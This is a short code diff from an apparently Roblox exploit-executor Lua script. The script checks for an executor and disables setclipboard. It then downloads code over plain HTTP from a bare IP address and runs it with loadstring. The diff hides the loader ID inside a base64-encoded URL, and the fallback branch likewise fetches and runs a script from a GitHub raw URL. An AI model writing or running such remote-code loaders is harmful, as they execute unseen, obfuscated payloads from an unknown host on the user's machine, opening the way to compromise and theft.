@@ -13,8 +13,7 @@ if identifyexecutor and (
 ) then
     
 setclipboard = function() return end
-ID="6710c962-7192-471b-8f42-cf9a1a8c4ab5"
-loadstring(game:HttpGet("http://72.56.90.233:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjY3MTBjOTYyLTcxOTItNDcxYi04ZjQyLWNmOWExYThjNGFiNSIsImtpbmQiOiJsb2FkZXIifQ"))()
 else
     loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testd3"))()
 end
